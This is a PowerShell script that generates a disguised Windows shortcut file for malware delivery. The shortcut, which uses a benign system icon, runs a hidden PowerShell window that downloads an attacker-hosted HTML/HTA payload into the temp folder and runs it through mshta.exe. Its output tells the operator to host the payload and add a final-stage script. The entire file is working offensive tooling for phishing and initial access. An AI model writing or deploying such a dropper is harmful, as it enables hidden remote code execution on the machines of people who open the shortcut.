param(
    [Parameter(Mandatory=$true)]
    [string]$URL,
    
    [Parameter(Mandatory=$true)]
    [string]$Output,
    
    [string]$Icon = "C:\Windows\System32\imageres.dll,48"
)

# Create LNK file using COM object
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($Output)
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-windowstyle hidden -Command `"Start-Process -WindowStyle Hidden mshta.exe `$env:TEMP\payload.html`"; Invoke-WebRequest -Uri '$URL' -OutFile `$env:TEMP\payload.html"
$Shortcut.IconLocation = $Icon
$Shortcut.Save()

Write-Host "[+] LNK file created: $Output"
Write-Host "[+] Execution command: powershell -windowstyle hidden -Command `"Start-Process -WindowStyle Hidden mshta.exe $env:TEMP\payload.html`"; Invoke-WebRequest -Uri '$URL' -OutFile $env:TEMP\payload.html"
Write-Host "[!] Host your HTML payload at: $URL"
Write-Host "[!] The HTML file should contain HTA/JS payload to execute final stage"
